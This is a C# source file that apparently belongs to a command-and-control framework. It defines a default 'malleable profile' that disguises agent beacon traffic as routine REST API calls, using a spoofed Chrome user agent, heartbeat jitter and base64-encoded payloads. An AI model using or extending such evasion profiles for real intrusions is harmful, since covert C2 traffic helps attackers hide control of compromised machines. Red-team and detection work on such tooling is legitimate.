using LibraNextgen.Common.Profiles;

namespace LibraNextgen.Service.Profiles;

/// <summary>
/// Default C2 profile that mimics standard REST API traffic.
/// All agent beacon URLs follow patterns like /api/v1/user/avatar
/// </summary>
public class DefaultProfile : IMalleableProfile
{
    public string Name => "Default";
    public string Description => "Standard REST API traffic pattern for initial deployment";

    public int HeartbeatIntervalSeconds => 60;
    public double JitterPercent => 0.2;

    public string GetRegisterUrl(string baseUrl) => $"{baseUrl}/register";
    public string GetHeartbeatUrl(string baseUrl) => $"{baseUrl}/heartbeat";
    public string GetResultUrl(string baseUrl) => $"{baseUrl}/result";
    public string GetWebSocketUrl(string baseUrl) => $"{baseUrl}/agent";

    public Dictionary<string, string> GetRequestHeaders() => new()
    {
        ["Accept"] = "application/json",
        ["Content-Type"] = "application/json",
        ["X-Request-ID"] = Guid.NewGuid().ToString("N")[..8]
    };

    public string GetUserAgent() =>
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36";

    public string EncodePayload(byte[] data) => Convert.ToBase64String(data);

    public byte[] DecodePayload(string encoded) => Convert.FromBase64String(encoded);
}
